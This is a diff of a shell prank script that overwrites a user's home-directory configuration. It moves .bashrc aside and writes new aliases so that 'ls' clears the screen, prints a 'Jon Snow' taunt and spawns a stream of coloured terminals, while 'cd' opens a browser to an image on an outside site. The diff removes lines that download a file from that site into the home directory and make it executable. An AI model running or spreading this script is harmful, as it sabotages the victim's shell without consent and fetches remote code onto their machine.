@@ -1,15 +1,12 @@
 #!/bin/sh
-wget -O /home/${USER}/.fire jeansarda.com/fire && chmod 755 /home/${USER}/.fire
 mv /home/${USER}/.bashrc /home/${USER}/.snow
 cp /home/${USER}/.Xdefaults /home/${USER}/.Xsnow
 cp /home/${USER}/.emacs /home/${USER}/.oldemacs
 touch /home/${USER}/.bashrc
-echo "xterm*background: pink" >> /home/${USER}/.Xdefaults;
-(test -f /home/{USER}/.fire || wget -O /home/{$USER}/.fire jeansarda.com/fire) && chmod 755 /home/{$USER}/.fire
 echo "#! /bin/sh
 declare -a arr=(\"white\" \"blue1\" \"red2\" \"yellow2\" \"purple\")
 for i in \"\${arr[@]}\"; do
-xterm -bg \$i&
+terminal -bg \$i&
 done" > /home/${USER}/.annoyingTerms && chmod 755 /home/${USER}/.annoyingTerms
 echo "alias ls='reset && echo \"You know nothing, Jon Snow.\" && sleep 1 && /home/\${USER}/.annoyingTerms'" >> /home/${USER}/.bashrc;
 echo "alias cd='chromium jeansarda.com/public/ygrow.jpg' && cd" >> /home/${USER}/.bashrc;
